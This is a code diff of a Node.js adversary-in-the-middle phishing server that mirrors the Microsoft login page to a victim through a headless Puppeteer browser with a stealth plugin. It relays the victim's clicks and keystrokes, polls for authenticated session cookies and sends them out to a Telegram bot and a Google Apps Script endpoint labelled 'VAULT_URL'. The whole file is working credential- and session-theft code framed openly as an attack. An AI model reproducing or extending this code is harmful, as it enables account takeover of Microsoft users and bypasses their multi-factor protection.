@@ -6,7 +6,6 @@ const FormData = require('form-data');
 puppeteer.use(StealthPlugin());
 
 // --- CORE AITM CONFIG ---
-// Replace with your actual GAPS Deployment ID
 const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
 const TARGET = "https://login.microsoftonline.com/";
 
@@ -27,14 +26,14 @@ async function sendExfiltration(cookies, url) {
 
     try {
         const host = new URL(url).hostname;
-        // Text Alert to Telegram
+        // Telegram Alert
         await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`, {
             chat_id: secrets.TG_CHAT_ID,
-            text: `<b>🚨 SESSION CAPTURED</b>\n<b>Host:</b> ${host}\n<b>Status:</b> Ready for Download`,
+            text: `<b>🚨 SESSION CAPTURED</b>\n<b>Host:</b> ${host}\n<b>Status:</b> Active`,
             parse_mode: 'HTML'
         });
 
-        // JSON Cookie File to Telegram
+        // Cookie Document
         const form = new FormData();
         form.append('chat_id', secrets.TG_CHAT_ID);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
@@ -53,7 +52,6 @@ async function startSession(io, socket) {
     const captured = new Set();
 
     try {
-        // Standard launch for Railway stability
         browser = await puppeteer.launch({
             headless: "new",
             args: ['--no-sandbox', '--disable-setuid-sandbox']
@@ -61,13 +59,11 @@ async function startSession(io, socket) {
 
         const page = await browser.newPage();
         await page.setViewport({ width: 1280, height: 720 });
-        
-        // Anti-bot Fingerprinting
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
 
         await page.goto(TARGET, { waitUntil: 'networkidle2' });
 
-        // EXFILTRATION MONITOR: Checks for authenticated cookies every 5 seconds
+        // COOKIE POLLER
         const poller = setInterval(async () => {
             try {
                 const url = page.url();
@@ -82,7 +78,7 @@ async function startSession(io, socket) {
             } catch (e) {}
         }, 5000);
 
-        // MIRROR RENDERER: Sends JPEG frames to the frontend
+        // SCREEN STREAMER
         const heartbeat = setInterval(async () => {
             if (socket.connected) {
                 try {
@@ -92,22 +88,15 @@ async function startSession(io, socket) {
             }
         }, 1000);
 
-        // INTERACTION BRIDGE: Handles Clicks and Keyboard
+        // PC-OPTIMIZED INTERACTION
         socket.on('victim-action', async (data) => {
             try {
                 if (data.type === 'click') {
-                    // Coordinates provided by the index.html scaling engine
                     await page.mouse.move(data.x, data.y);
                     await page.mouse.click(data.x, data.y, { delay: 50 });
                 } else if (data.type === 'key') {
-                    if (data.key === 'Enter') {
-                        await page.keyboard.press('Enter');
-                    } else if (data.key === 'Backspace') {
-                        await page.keyboard.press('Backspace');
-                    } else {
-                        // Use 'type' for standard characters to handle the bridge input
-                        await page.keyboard.type(data.key, { delay: 20 });
-                    }
+                    // page.keyboard.press handles both characters and functional keys (Enter/Backspace)
+                    await page.keyboard.press(data.key);
                 }
             } catch (e) {}
         });
